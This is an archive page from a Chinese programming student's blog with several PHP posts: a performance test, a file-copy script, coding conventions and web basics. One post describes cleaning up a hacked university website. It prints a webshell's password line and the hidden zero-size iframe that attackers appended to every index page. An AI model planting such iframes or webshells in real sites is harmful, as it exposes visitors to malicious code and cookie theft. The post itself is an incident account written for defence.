</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php探索/" class="post__tag__link">php探索</a></li></ul><a href="/2010/07/16/hierarchical-data-show-in-html/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-07-15T02:10:58.000Z" class="post__time">July 15, 2010</time><h1 class="post__title"><a href="/2010/07/15/test-of-array_key_exists-vs-isset/">isset和array_key_exists的比较测试</a></h1></header><div class="post__main"><p>经常使用isset和array_key_exists测试数组中的变量是否存在，然后忽然很想知道到底两者有什么区别，然后百度了一下，有说 array_key_exists<a href="www.laohucheng.com/post/122/">更快</a>的，也用说isset更快的，当然似乎更多人建议 isset。</p>
<p>于是自己做了一个测试，比较一下两者的差异：注，本文最初发在<a href="http://codeigniter.org.cn/forums/thread-5991-1-1.html" target="_blank">ci论坛</a></p>
<p>结果大致如下：</p>
<p>当数组个数为10时，两者差异就体现出来了——isset速度要快近10倍，但不是很明显，而且对于变量是否存在，两者之间的差异没有太大，当变量存在时运行更快，但是这种趋势在是非常微弱的。使用 array_key_exists随着循环的次数增加，程序运行的时间增加量是成几何级数增加的，当一个数组元素个数超过 1000时运行速度就非常慢了。</p>
<p>最后总结如下：</p>
<p>1、isset和array_key_exists在对判断一个数组函数中某个元素是否存在，isset速度要更快，而且这 种速度差异是非常大的</p>
<p>2、isset属于php中的语言结构，而后者是函数，所以前者更快，isset不可 以用于可变函数</p>
<p>3、对于变量值的判断，当变量为NULL时，isset返回的结果是false，而后者只判断变量是否存在。所以如果判断一个数组中的某个 元素，并且判断其是否是否为真，应该用isset</p>
<p>4、isset属于php特定语言结构，后者在其他语言中也存在，更具可读性</p>
<p>具体测试过程，使用<a href="http://codeigniter.org.cn" target="_blank">ci</a>基准测试类测试</p>
<figure class="highlight"><pre>    function issetVsArray()
    {
        <span class="variable">$loop</span> = <span class="number">10</span>;

        <span class="variable">$test</span> = array();
        <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &<span class="keyword">lt</span>;= <span class="variable">$loop</span>; <span class="variable">$i</span>++)
        {
            <span class="variable">$test</span>[<span class="string">'test'</span>.<span class="variable">$i</span>] = <span class="variable">$i</span>;
        }

        <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;mark(<span class="string">'issetAllFalse'</span>);

        <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&<span class="keyword">lt</span>;=<span class="variable">$loop</span>; <span class="variable">$i</span>++)
        {
            isset(<span class="variable">$test</span>[<span class="string">'t'</span>.<span class="variable">$i</span>]);
        }
        <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;mark(<span class="string">'arraysAllFalse'</span>);
        <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&<span class="keyword">lt</span>;=<span class="variable">$loop</span>; <span class="variable">$i</span>++)
        {
            array_key_exists(<span class="string">'t'</span>.<span class="variable">$i</span>,<span class="variable">$test</span>);
        }

        <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;mark(<span class="string">'issetAllTrue'</span>);
        <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&<span class="keyword">lt</span>;=<span class="variable">$loop</span>; <span class="variable">$i</span>++)
        {
            isset(<span class="variable">$test</span>[<span class="string">'test'</span>.<span class="variable">$i</span>]);
        }
        <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;mark(<span class="string">'arraysAllTrue'</span>);
        <span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&<span class="keyword">lt</span>;=<span class="variable">$loop</span>; <span class="variable">$i</span>++)
        {
            array_key_exists(<span class="string">'test'</span>.<span class="variable">$i</span>,<span class="variable">$test</span>);
        }
        <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;mark(<span class="string">'end'</span>);

        echo <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;elapsed_time(<span class="string">'issetAllFalse'</span>,<span class="string">'arraysAllFalse'</span>).<span class="string">'&lt;br /&gt;'</span>;
        echo <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;elapsed_time(<span class="string">'arraysAllFalse'</span>,<span class="string">'issetAllTrue'</span>).<span class="string">'&lt;br /&gt;'</span>;
        echo <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;elapsed_time(<span class="string">'issetAllTrue'</span>,<span class="string">'arraysAllTrue'</span>).<span class="string">'&lt;br /&gt;'</span>;
        echo <span class="variable">$this</span>-&<span class="keyword">gt</span>;benchmark-&<span class="keyword">gt</span>;elapsed_time(<span class="string">'arraysAllTrue'</span>,<span class="string">'end'</span>).<span class="string">'&lt;br /&gt;'</span>;
    }
</pre></figure>

<p>几次测试结果：</p>
<figure class="highlight"><pre>循环<span class="number">10</span>次，<span class="variable">$loop</span>=<span class="number">10</span>
<span class="number">0.0001</span>
<span class="number">0.0009</span>
<span class="number">0.0001</span>
<span class="number">0.0007</span>

循环<span class="number">100</span>次，<span class="variable">$loop</span>=<span class="number">100</span>
<span class="number">0.0003</span>
<span class="number">0.0185</span>
<span class="number">0.0003</span>
<span class="number">0.0189</span>

循环<span class="number">1000</span>次，<span class="variable">$loop</span>=<span class="number">1000</span>
<span class="number">0.0015</span>
<span class="number">0.2831</span>
<span class="number">0.0020</span>
<span class="number">0.2839</span>

循环<span class="number">10000</span>次，<span class="variable">$loop</span>=<span class="number">10000</span>
<span class="number">0.0157</span>
<span class="number">8.4764</span>
<span class="number">0.0164</span>
<span class="number">8.4101</span>
</pre></figure>

</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php探索/" class="post__tag__link">php探索</a></li></ul><a href="/2010/07/15/test-of-array_key_exists-vs-isset/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-06-27T00:17:07.000Z" class="post__time">June 27, 2010</time><h1 class="post__title"><a href="/2010/06/27/listen/">使用php获得听力光盘中需要考试的类容</a></h1></header><div class="post__main"><p>都大三了，还要考听力，是在汗颜啊。作为东师人，大家都知道，听力考试只需要背诵那么几部分，而那基本分的听力都全部在光盘中snd文件夹中，wma格式，OK，那个软件太bt——每次都把电脑分辨率调到800px，都什么时代了，而且看电脑挺太磨叽。直接拷贝出音频还可以在p3上听。</p>
<p>任务就这样了，作为一个程序员有一个基本素质是：不做重复的工作——那是电脑的任务（vim创始人之语）。10个单元的题目，怎么把它拷贝出来呢？
首先，把第一单元的听力考出来，放到文件夹“听力”中，一共8个文件，文件名分别是</p>
<ol>
<li>u01LIT1f.wav</li>
<li>u01LIT2f.wav</li>
<li>u01LIT3f.wav</li>
<li>u01LSD01f.wav</li>
<li>u01LSD02f.wav</li>
<li>u01LSD03f.wav… (1到5)</li>
</ol>
<p>然后写一个php脚本：</p>
<figure class="highlight"><pre>define(<span class="string">'SOURSES'</span>,<span class="string">'G:/snd/'</span>);

<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">6</span>;<span class="variable">$i</span>&amp;lt;=<span class="number">10</span>;<span class="variable">$i</span>++)
{
    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&amp;lt;=<span class="number">3</span>;<span class="variable">$j</span>++)
    {
        <span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">10</span>)
        {
            <span class="variable">$filename</span> = <span class="string">'u'</span>. <span class="variable">$i</span> .<span class="string">'LIT'</span>. <span class="variable">$j</span> .<span class="string">'f.wav'</span>;
        }
        <span class="keyword">else</span>
        {
            <span class="variable">$filename</span> = <span class="string">'u0'</span>. <span class="variable">$i</span> .<span class="string">'LIT'</span>. <span class="variable">$j</span> .<span class="string">'f.wav'</span>;
        }
        <span class="variable">$p</span> = <span class="keyword">fopen</span>(<span class="variable">$filename</span>,<span class="string">'w+'</span>);
        copy(SOURSES.<span class="variable">$filename</span>,<span class="variable">$filename</span>);
        <span class="keyword">fclose</span>(<span class="variable">$p</span>);
    }

    <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">1</span>;<span class="variable">$k</span>&amp;lt;=<span class="number">5</span>;<span class="variable">$k</span>++)
    {
        <span class="keyword">if</span>(<span class="variable">$i</span>==<span class="number">10</span>)
        {
            <span class="variable">$filename</span> = <span class="string">'u'</span>. <span class="variable">$i</span> .<span class="string">'LSD0'</span>. <span class="variable">$k</span> .<span class="string">'f.wav'</span>;
        }
        <span class="keyword">else</span>
        {
            <span class="variable">$filename</span> = <span class="string">'u0'</span>. <span class="variable">$i</span> .<span class="string">'LIT'</span>. <span class="variable">$j</span> .<span class="string">'f.wav'</span>;
        }
        <span class="variable">$p</span> = <span class="keyword">fopen</span>(<span class="variable">$filename</span>,<span class="string">'w+'</span>);
        copy(SOURSES.<span class="variable">$filename</span>,<span class="variable">$filename</span>);
        <span class="keyword">fclose</span>(<span class="variable">$p</span>);
    }
}
</pre></figure>

<p>Ok，在建立一个a.bat文件输入：</p>
<figure class="highlight"><pre><span class="variable">$ </span>php a.php
</pre></figure>

<p>a.php是php文件名，把这两个文件放在最初建立的‘听力’文件夹中，双击 a.bat就可以啦。那个php代码非常简单，只使用了一个copy函数，基本会英语的人就能看明白什么意思
注：前提是在个人电脑上安装好了 php。当然也可以使用其他语言，但是作为phper，也应该多尝试尝试php的各种功能，还是很有用的</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php探索/" class="post__tag__link">php探索</a></li></ul><a href="/2010/06/27/listen/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-04-25T00:40:48.000Z" class="post__time">April 25, 2010</time><h1 class="post__title"><a href="/2010/04/25/webshell/">窥视网站木马安装过程——webshell</a></h1></header><div class="post__main"><p>这几天总是发现教科院新网站总是被挂马，第一次听到有人说网站被360浏览器报告有木马，很烦躁，这怎么可能呢……然后想，这个360浏览器也太差了吧， 怎么能够随便报告木马。然后没多久又报告大一信息员在添加文章时候发现居然打开不开文章添加页面了。我一看果然中木马了，于是马上把所有文档下载下来，清 除木马，然后又修补了网站的几个漏洞，查了下sql日志文件，也没有发现什么蛛丝马迹，一点头绪都没有，怎么会这样被修改网页啊。也没有发现可疑文件呀。 就这样一直忙到下午三点半还没有吃饭。</p>
<p>又过了几天，居然又全部中毒……而且情况基本和上次完全一样，所有目录下的index.php | html | htm文件全部被追加了一段xss代码，还有一个config文件被改，于是又修复了几个漏洞，但是还是不知道这到底怎么回事，新 网站本身的安全性能很高啊，怎么会这样被修改。然后仔细查看了所有文件，还是没有问题。</p>
<p>这个周末，又发现木马了！实在痛苦，不知是哪里的黑客这么烦人、卑鄙。绝对鄙视这种家伙。又是一次长时间的查看修复。一切恢复以后了，还是和前两次一样。忽然我想也许在老网站的更目录下有 webshell也说不定，新网就放在老网站中的一个文件夹中，如果老网站上有webshell，那新网站无论如何安全也同样只有被宰割的命运了。果然不到一分钟就发现一个怪异的文件z.asp，一看第一行是：</p>
<figure class="highlight"><pre><span class="attribute">UserPass</span>=<span class="string">&quot;1&quot;     '密码串</span>
</pre></figure>

<p>这种文件通常就是 webshell了。在此介绍一下什么是webshell吧：webshell对于一个攻击者而言是一个完全占领一个服务器的脚本，webshell和网 站本身所运行的语言是一致的，比如教科院的网站可以运行php文件，也可以运行asp文件，那么这个z.asp就是一个恶意的文件，webshell的一 个特性是可以通过它来查看服务器上的所有文件并且可以随意的操作（包括下载修改删除），这个webshell本身和网站运行权限是一致的。</p>
<p>传 webshell到服务器上通常有几个途径，直接上传和通过网站漏洞（比如sql注入漏洞，利用网站程序本身写入webshell）。接下来当然是直接删 除webshell啦，还发现一个规律，webshell通常比较大，而一般的一个正常的脚本文件会在30kb以下，所以那些大的可运行文件通常非常可 疑。</p>
<p>然后，居然在网站上发现了4个webshell，三个asp，一个php的。下面让大家看看webshell怎么工作的吧：
首先是运行，这个webshell在根目录下，在根目录上我们更容易发现而已，希望在其他目录上不要有才好啊，有机会得写一个webshell检测的工具才 行。对于z.asp这个shell运行很简单，直接输入<a href="http://edu.nenu.edu.cn/z.asp就可以啦，当然这个页已经被我删除" target="_blank">http://edu.nenu.edu.cn/z.asp就可以啦，当然这个页已经被我删除</a> 了，下面是一个很酷的登陆界面</p>
<p>密码 就在上面了，UserPass=&quot;1&quot; ，输入1就可以就去了</p>
<p><img src="http://eblog.nenu.edu.cn/UploadFiles/2010-4/425953304.jpg" alt=""></p>
<p>这就是主页面了，和本地的文件浏览没有什么差别，而且使用也没有什么技术难度，在这里很容易看到了传媒学院 的网站（和教课的网站放在一个目录下，所有的目录都用椭圆盖住了），然后看了下传媒的网站，确实也被注入了脚本，在文件夹旁边就有几个选项 （copy,del,move,Down)，多危险啊，这里还发现了学校主页的备份，webshell下的网站是如此脆弱啊。下面是这个挂木马的工具：</p>
<p><img src="http://eblog.nenu.edu.cn/UploadFiles/2010-4/425608279.jpg" alt=""></p>
<p>呵呵，原来木马就是这样插入的啊，还发现这个有扫描木马的功能呢，也许有用。最后在本地机 上实验了一下，果然非常成功地在本身挂上了木马，而且和网站上情况一模一样——所有文件后面追加木马：</p>
<figure class="highlight"><pre><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://127.0.0.1/m.htm"</span> <span class="attribute">width</span>=<span class="value">0</span>  <span class="attribute">height</span>=<span class="value">0</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span>
</pre></figure>

<p>这个文件用户在浏览器上是看不到的，高度宽度都等于0，却暗中加载了一些任意的恶意代码。比如获取正在浏览的用户cookie，甚至是控制浏览此网页的用户</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/网络安全/" class="post__tag__link">网络安全</a></li></ul><a href="/2010/04/25/webshell/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-03-12T01:00:49.000Z" class="post__time">March 12, 2010</time><h1 class="post__title"><a href="/2010/03/12/winter-vacation-summary/">寒假学习总结</a></h1></header><div class="post__main"><p>一个寒假过来，这几天还在忙于适应学校生活呢。在家里一个多月几乎与电脑完全隔离，几许欣慰，总算不用整天对着电脑啦，呵呵。按照有关规定：每天上网6小时以上属于网瘾，那我们工作室所有人都有网瘾啦。不过技术总无法离我而去，有时候甚至想，来到工作室，一旦进入计算机世界，我就只能如此了吧。而且我越来越清楚的看到，自己对计算机技术的书爱不释手，而本专业的教材却很难静心看下去。无论如何，我总是在挣扎着，专业一定不能放弃啊。我也相信自己能够做到。第一次会上，副部老冯说：“寒假让你们回去看的资料，大家有什么体会，都写下来……”。也许大家都不喜欢做家庭作业吧，我也是，但在寒暑假看一些技术类的书，已然成为我的一种习惯。我觉得，作为程序组人员，对于技术的爱好是一种基本素质，所以我更倡导一种自然的学习方式，大家对什么感兴趣自己去学吧。只要投入，你就能从中发现乐趣的。在这里再提一下我们工作室的口号“激情投入，互动创造”，我很喜欢这句话，大家在工作室应该享受一种投入创造的快乐。下面总结一下我在寒假的学习情况吧。</p>
<p>寒假带了三本薄薄的书，书贵在精致，而不是数量，一个假期能看两三本书就够了。这三本书分别是，PHP高级程序设计_模式、框架与测试 、JavaScript语言精粹。还有一本是心理学的，就不提啦。这第二本尤其让人震撼，在此我摘一些卓越网的评价：这是一本厚积薄发、“薄”大精深的书。 Douglas Crockford仅仅用了160页来道出JavaScript的语言本质，值得任何正在或者想从事JavaScript开发的人阅读，并且非常需要反复阅读。……重读这本书后，如醍醐灌顶，对JS有了新的认识。不能不说这本JS语言精粹是我读过的一本最好的技术类书。我尤其喜欢这种简约的风格。总的来说，寒假的学习分为三大类，PHP、JavaScript和Vim使用。分别来谈谈</p>
<p>首先是PHP，这个寒假接触了一些PHP高级技术，比如PHP类、设计模式之类的。我觉得对于我们而言，书中所提到的PHP编码规范是很值得我们学习的，程序代码中的编码规范通常包括两大点：变量的命名和注解规范。还有一点就是代码的缩进，这个通常用tab键实现。常用的变量命名法（也包括css属性名或者class id名）有四种：匈牙利命名法、骆驼命名法、下划线命名法和帕斯卡命名法。在这里各举一个PHP命名的例子</p>
<p>$strMessage，这里str表示的变量贮存的是一个字符串string，匈牙利命名法关键是：变量名＝属性＋类型＋对象描述</p>
<p>$nowDateCn，驼峰命名就是当变量名或函式名是由一个或多个单字连结在一起，而构成的唯一识别字时，第一个单字以小写字母开始；第二个单字的首字母大写或每一个单字的首字母都采用大写字母。</p>
<p>$now_date_cn，下划线命名用下划线分割变量，这在css中属性常用</p>
<p>$NowDateCn，帕斯卡命名法与驼峰命名法的差别仅仅在于它的第一个单词首字母也是大写的。</p>
<p>各种命名法其实可以混合使用，尤其是第一种和第三种可以很好的结合在一起使用。需要提醒的是，在一个应用程序中，应该坚持统一的命名规则，这样有利于代码的维护阅读。我想我们工作室最好能够形成一套统一的规范，这个工作我正在考虑当中呢。我们应该给工作室留下一些什么，比如还有我们需要一个常用的类库，这非常有利于我们的快速开发。
关于注解，PHP常用为 phpdoc模式，如下为一个函数的注解</p>
<figure class="highlight"><pre><span class="javadoc">/**
* 提交发送数据返回已序列化的PHP数据内容
*
*<span class="javadoctag"> @param</span> string $PostUrl 要指交的远程地址
*<span class="javadoctag"> @param</span> array $data 要提交的数据
*<span class="javadoctag"> @return</span> obj  远程返回的对像
*/</span>
function getWebServerData($PostUrl,$data)
{
<span class="comment">//函数体</span>
}
</pre></figure>

<p>第一行为/<em>*，最后一行</em>/，这种注解模式是一种可编译模式，也就是程序在编译时，这些注解不会被PHP解析程序忽视，而是可以成为一种PHP函数或类自身反射的信息数据。反射在程序中指的是一种语言对自身的判断，比如PHP函数func_get_args可以在本函数中或者传入参数序列。这有些想心理学中的元的概念，比如元认知，元记忆，元认知是指人对自身认知活动的时间分配、精力控制等等调控行为，而元记忆指人对自身记忆的记忆，也就是你知道自己记得什么（有些东西虽然自己知道自己记得，但是在某些情况下就是想不起来，比如某个熟人的名字一下子忘记了）。不过这对于我们没有太大的用处，在小规模应用中，很难用到反射的。所以注解用/*开头也行。@param这个表示传入参数，后面是函数参数类型，这个很容易看明白的。注解内容第一行是对本函数的描述。@param，@return这两个参数在函数注解中用得最多。</p>
<p>再看看Zend framework的注解，常用的还有@author表示作者</p>
<figure class="highlight"><pre><span class="javadoc">/**
* Zend Framework
*
* LICENSE
*
* This source file is subject to the new BSD license that is bundled……
*
*<span class="javadoctag"> @category</span>   Zend
*<span class="javadoctag"> @package</span>    Zend_Db
*<span class="javadoctag"> @subpackage</span> Table
*<span class="javadoctag"> @copyright</span>  Copyright (c) 2005-2009 Zend Technologies USA Inc. (http://www.zend.com)
*<span class="javadoctag"> @license</span>    http://framework.zend.com/license/new-bsd     New BSD License
*<span class="javadoctag"> @version</span>    $Id: Exception.php 16541 2009-07-07 06:59:03Z bkarwin $
*/</span>
</pre></figure>

<p>注解规范也属于代码规范的重要内容之一啦。说这么多其实，我的目的是能够在工作室留下一套常用的PHP类库或函数库，并且告诫程序组成员，代码是人可以阅读的计算机语言，所以可读性很重要。不过一个优秀的好用的函数库或类库，最重要的还是它们的逻辑实现过程，这个得靠大家的一起努力啦。工作室大一组员要加油啦，下学期也许我整个学期都要去实习，工作室重任就落在你们肩上了。此外就是JavaScript啦，这个暂时搁置，有机会给大家做一个 JavaScript专题，现代web技术JavaScript太强大了，这个世界已然不能没有你。那本JavaScript语言精粹，大家想看的可以问我要，现在我又借过来，准备看第二遍呢。</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php探索/" class="post__tag__link">php探索</a></li><li class="post__tag__item"><a href="/tags/经验分享/" class="post__tag__link">经验分享</a></li></ul><a href="/2010/03/12/winter-vacation-summary/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2009-11-23T01:07:52.000Z" class="post__time">November 23, 2009</time><h1 class="post__title"><a href="/2009/11/23/web-concept/">网站概念——第三次培训总结</a></h1></header><div class="post__main"><p>程序组又加入几个新人，为了让大家能够尽快在同一平台上学习，总结了一下第三次培训的内容，感觉这次培训的内容挺多的，大家可能一时无法完全接受，就在此总结让大家有时间可以回过头看看……</p>
<p>本次培训的主要目的上让程序组成员对于网站工作的基本原理有所认识，培训以网站概念为核心。</p>
<p>首先，介绍一下什么是网站：网站是远程服务器端文件以及文件之间逻辑结构（这个只是我的个人理解定义的，为了让大家更直接的感受一下网站实体，这个定义是我们程序组需要直接面对的部分，所以特意的提出来，当然网站还可以从其他角度了理解，我只是从我们程序员角度来定义它）。</p>
<p>这个概念解释一下，远程端的文件，网络的基本功能就是不同电脑之间文件（或者说数据）传输，Internet把这个世界的电脑都链接在一起，我们在浏览器上看到的任何一个网页都是指向远端（相对于本机而言）电脑上的一个文件。这里还涉及到两个概念，域名和url，域名指向的通常是一个远端的文件夹，比如我们efly的域名efly.nenu.edu.cn指向的就是我们服务器上一个efly的文件夹。url指向的是远端文件，还是我们e翔的url<a href="[http://efly.nenu.edu.cn"><a href="http://efly.nenu.edu.cn">http://efly.nenu.edu.cn</a></a>，这个url并不是完整的，它实际上指向的是<a href="http://efly.nenu.edu.cn/index.asp" target="_blank"><a href="http://efly.nenu.edu.cn/index.asp">http://efly.nenu.edu.cn/index.asp</a></a>，只是一个url可以在没有确定访问的文件时会指向一个默认的文件，这些文件都是一index为文件名，文件的后缀通常有html、htm、php、asp、jsp。随意拿一个url来给大家演示一下：user1/wangchao/archives/2009/2054.html这个url其实和我们本机的“C:\Documents and Settings\Administrator\桌面\团队文化\团队文化\56xiao.jpg”效果是一样的，只不过我们访问本机速度快很多而已。我们打开的是网页，实际上我们是把在我们服务器上的文件给下载到本机上，用浏览器查看，而那个我们下载下来的文件是符合浏览器解释标准的文档，通常是html文档。</p>
<p>从上面我们可以看出，网站的实体是远端的文件。而实际上由于我们要给浏览者看的文件需要更方便用户查看，所以这些远程文档的组织需要有一定的逻辑结构。首先主页，主页必须让浏览者知道我们的网站有一些什么东西，这个功能主要是由网站的导航实现，第二网站首页需要有网站的信息，比如文章新闻之类的，这部分是需要动态显示，也就是首页的新闻是需要更新的，下面我们想象一下，我们的主页url指向的是一个文件比如index.php，我们怎么才能让这个文件在不同时间不一样呢，应该说是有两种方法：</p>
<ol>
<li>随时修改文件本身。</li>
<li>让文件调用数据库中的数据，通过修改数据库来改变文件的显示。</li>
</ol>
<p>我们看第一种方法，在页面简单的情况下到是没有问题，但是通常我们的网页信息更新非常频繁的，这种方法修改主页本身这个过程我们增加了额外的负担（我们只想把一条新闻提前，而这个却让我们需要修改这个主页整个页面）。而第二中方法就可以避免修改整个页面的问题，我们可以直接按照一定的规则选择需要显示的东西放在网页上，这个规则就是网站的文件之间的逻辑结构，这个逻辑结构是由服务器端程序如php代码实现的。</p>
<p>讲完什么是网站了，在这里因为不好实际的演示，我写一个小小的例子吧：服务器端有一个文件夹example，域名www.example.com指向此文件夹，所以当我在浏览器中输入www.example.com，浏览器会自动向此服务器发送请求，这个请求会被服务器软件（如apache，这个应该讲过）截获，apache会判断这个url指向的是example中一个文件，我们假设它是index.php。这个文件的代码是：</p>
<figure class="highlight"><pre>echo  date(&quot;<span class="constant">Y</span>-m-d <span class="constant">H</span><span class="symbol">:i</span><span class="symbol">:s&quot</span>;);
</pre></figure>

<p>这是一个简单的代码，这个代码会在服务器上进行运算，然后这个得到的结果是代码运行时间以2009-11-2316:37:43这种格式输出，这个输出由apache发送，通过http协议发送到浏览器上，然后我们就可以在浏览器上看到2009-11-2316:37:43。什么是网站这个东西大家真正接触了就能更清晰这个概念了。总的来说作为网站程序员我们需要做的是两个，一是浏览器端的显示，我们需要写出符合浏览器端显示的html代码；第二就是后台服务器端的文件之间逻辑结构，这部分以后的培训会讲。</p>
<p>浏览器端主要由是html代码，很多人简称之为div+css，实际上这个只是为了强调css和html中div标签的作用。这部分更多的是操作性的，程序组的新人要多和一直的程序组的成员多交流。我懒得在讲一遍了，就上传一个网上别人总结的pdf文件DIVCSS布局大全.pdf，应该对大家会有所帮助的。</p>
<p>公布一下下一次的考核是让大家根据一个psd的图，把它切成html代码的。这个图大家在此下载。在这里说一下考核的标准：</p>
<ol>
<li>要求在浏览器上的必须与图片一致，这个要求通常很难达到，大家尽力而为吧</li>
<li>要求html代码结构清晰，层级之间缩进符合要求，代码要求符合规范，最好能加注解</li>
<li>要求尽力使文件小，因为我们做的html需要通过网络发送到客户机上，对大小要求是越小越好。</li>
<li>考核的时间有一个月准备时间，具体的根据你们自己的能力来完成，如果学得快可以提前进入php学习。</li>
</ol>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/经验分享/" class="post__tag__link">经验分享</a></li></ul><a href="/2009/11/23/web-concept/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2009-06-22T01:37:00.000Z" class="post__time">June 22, 2009</time><h1 class="post__title"><a href="/2009/06/22/php-learning-experience/">PHP学习经验分享</a></h1></header><div class="post__main"><p>前言：很久以前的经验了，现在看来，却不是怎么合适，计算机技术发展太快了。</p>
<p>某天早上在图书馆看书，其中有一篇文章谈及中国大学与欧美大学的一些差异，作者指出，中国文化传统下，实际山我们一直有一种精英教育的情节——在中国古代一直以来，文化都只掌握在少部分人手中，技术在中国通常是以家族或者师承关系流传下去，也就是说，我们倾向于把自己的技能保留作为一种交换的资源。这种保守的思想在现代社会非常不利于社会的发展，尤其是技术方面。</p>
<p>就从PHP来说，它本身就是开源社区共同创作的产物。我们可以很明显的感觉到关于php技术的资料在国外更多，如这篇关于dom处理xml的文章<a href="http://www.ibm.com/developerworks/cn/opensource/os-xmldomphp/" target="_blank">http://www.ibm.com/developerworks/cn/opensource/os-xmldomphp/</a> ，几乎所有其他php论坛都引用了（如phpchina），只有在IBM的技术论坛上我才知道这篇文章是出自Jack D. Herrington，中国人喜欢转载可是从来没有注明出处的习惯，这又一定程度上反映我们版权意识太过薄弱，如此文章在IBM技术论坛上还有很多。不是是不是谷歌在同IBM合作还是其他什么原因，每次搜素一些较新的PHP技术（例如xml，yaml等等）文章大都来自<a href="http://www.ibm.com/developerworks/cn/opensource。也许这一切都在谷歌掌控之下，不过那些文章确实写的很好，却都是翻译过来的，而中国的一些论坛通常只是复制粘贴过来而已。" target="_blank">http://www.ibm.com/developerworks/cn/opensource。也许这一切都在谷歌掌控之下，不过那些文章确实写的很好，却都是翻译过来的，而中国的一些论坛通常只是复制粘贴过来而已。</a></p>
<p>网上不过关于PHP优势的一句话还是很对的 ——关于PHP的问题在网络基本都能找到答案。几乎PHP就是一种开源共享的象征，PHP官方文档就有很多人留下的一些讨论、函数使用实例，虽然全是英文的，但直接拿过来用也就行，没什么不方便的。</p>
<p>我似乎也算学PHP有一年了，还是有一堆常用函数不会用，每次都要上网去查，写html了就用 Dreamweaver，有时候甚至感觉做PHP似乎也是在做平面——总是在完成一些把某个变量放某处之类的工作。</p>
<p>当然，在真正做一些东西，是很开心的，就是在做的时候感觉自己应该能完成的更好更快，因而会很烦躁。前天做一个数学建模的论文（选修课），就使用PHP实现一个计算过程，然后把哪一些PHP源码粘在论文上，呵呵不管老师能否看懂，总算字数是够用了。PHP很多时候也可以用来操作本地文件、数据，这很多时候可以省去学习批处理语言精力。</p>
<p>最后推荐几个PHP学习使用的工具、模板：</p>
<p>zend studio：专业的PHP编译器，最新的是基于eclipse的，好用的不得了,用了就知道</p>
<p>Sajax：一个简单的ajax开发框架，它的官网提供各种语言的实现。具体使用如下：定义一个js函数x_fuc()，这个函数php中相对应的有一个fuc的函数，包含Sajax.php，x_fuc的参数中最后一个是处理ajax请求得到的数据，前面几个参数是传人服务器的数据，到php文件中fuc函数中，fuc函数传出的数据发送到x_fuc函数最后一个参数的函数中。实例：js中调用</p>
<figure class="highlight"><pre>x_fuc(<span class="operator">a</span>,b,doit)()<span class="comment">---&gt;</span>
</pre></figure>

<p>php服务器端</p>
<figure class="highlight"><pre>fuc(<span class="variable">$a</span>,<span class="variable">$b</span>){
  <span class="regexp">//</span>操作
  <span class="keyword">return</span> <span class="variable">$d</span>;
}
</pre></figure>

<p>数据$d发送到js中的函数 doit(d)中</p>
<figure class="highlight"><pre><span class="function">doit(d)</span>{
  <span class="function">alert(d)</span>;<span class="comment">//这样就实现一个异步发送过程，过程中其他js文件由Sajax文件处理</span>
}
</pre></figure>

<p>Sajax下载的还附带有例子，可以参照使用还有一些大的框架，qeephp之类的，更适合那些大的功能开发。康盛公司的一系列门户网站、论坛、博客系统，康盛旗下还有一个很好的论坛phpchina。一般的问题，谷歌就好，我不喜欢百度，百度搜索PHP函数经常出现一大堆PHP培训广告！</p>
